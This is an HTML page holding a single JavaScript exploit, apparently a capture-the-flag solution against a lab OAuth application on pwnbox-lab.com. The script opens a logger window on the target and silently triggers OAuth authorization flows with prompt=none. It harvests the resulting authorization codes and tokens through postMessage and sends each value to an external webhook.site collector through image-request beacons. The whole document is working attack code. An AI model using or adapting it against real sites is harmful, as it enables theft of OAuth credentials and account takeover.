<!doctype html>
<meta charset="utf-8">
<script>
const APP = 'https://solo-leveling-3-0858adee1fc9.pwnbox-lab.com';
const IDP = 'https://google-0858adee1fc9.pwnbox-lab.com';
const LEAK = 'https://webhook.site/d6b0bb65-c7e6-43ad-9762-1804b0bb7e41';
const RUN = 'p' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);

function ping(k, v) {
  new Image().src = LEAK + '?' + k + '=' +
    encodeURIComponent(v == null ? '1' : v) + '&run=' + RUN;
}

ping('loaded', location.href);

const loggerWin = window.open(APP + '/logger', 'logger_' + RUN, 'width=520,height=420');
ping('logger', loggerWin ? 'open' : 'blocked');

function auth(rt, state, name) {
  const u = IDP + '/o/oauth2/v2/auth'
    + '?client_id=solo-leveling-3-client'
    + '&redirect_uri=' + encodeURIComponent(APP + '/callback')
    + '&response_type=' + encodeURIComponent(rt)
    + '&scope=' + encodeURIComponent('openid email profile')
    + '&prompt=none'
    + '&state=' + encodeURIComponent(state);
  const w = window.open(u, name, 'width=520,height=420');
  ping(name, w ? 'open' : 'blocked');
  return w;
}

auth('code', 'C_' + RUN, 'idpCode_' + RUN);
setTimeout(() => { auth('code token', 'T_' + RUN, 'idpToken_' + RUN); }, 1200);

const seen = new Set();
window.addEventListener('message', (e) => {
  if (!e.data || e.data.type !== 'loggerData') return;
  const raw = e.data.data;
  if (raw && !seen.has(raw)) {
    seen.add(raw);
    ping('raw', raw);
  }
});

const t = setInterval(() => {
  if (loggerWin) {
    try { loggerWin.postMessage({ type: 'get' }, '*'); } catch (err) {}
  }
}, 200);

setTimeout(() => clearInterval(t), 15000);
setTimeout(() => {
  ping('done', [...seen].join('|').slice(0, 1800));
}, 16000);
</script>
